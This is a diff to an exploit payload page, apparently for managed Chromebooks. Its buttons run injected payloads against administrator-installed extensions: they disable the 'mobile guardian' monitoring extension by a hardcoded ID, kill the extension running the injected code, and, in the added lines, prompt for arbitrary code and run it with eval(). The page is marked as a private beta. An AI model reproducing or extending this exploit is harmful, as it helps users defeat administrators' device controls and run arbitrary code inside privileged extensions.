@@ -10,9 +10,9 @@ const managementTemplate = `
 
 <div id="chrome_management_disable_ext">
 <h1>a specially crafted payload page by appleflyer</h1>
+<h2>Updated by Jobi#8313 on discord :)</h2>
+<br><br>
 <p> Note that this only works on extensions installed by your administrator </p>
-<h2>Evaluate code</h1>
-<input type="text" id="code_input"/><button id="code_evaluate">Evaluate</button>
 <button id="payload-1">P1 test payload</button>
 <br>
 <button id="payload-2">P2 kill mobile guardian(hardcoded id)</button>
@@ -22,6 +22,8 @@ const managementTemplate = `
 <button id="payload-4">P4 get self id and alert</button>
 <br>
 <button id="payload-5">P5 kill ext thats running injected code</button>
+<br>
+<button id="payload-6">Execute custom code</button>
 </div>
 
 info: DO NOT SHARE, BETA
@@ -363,6 +365,12 @@ onload = async function x() {
         alert("payload 5 executed");
         var grabidtokill = chrome.runtime.id;
         chrome.management.setEnabled(grabidtokill, false);
+      };
+    container_extensions.querySelector("#payload-6").onclick =
+      async function dx(e) {
+        alert("payload 6 executed");
+        let testprompt = window.prompt("Code to evaluate");
+        eval(testprompt);
       };
   }
   const otherFeatures = window.chrome.runtime.getManifest();
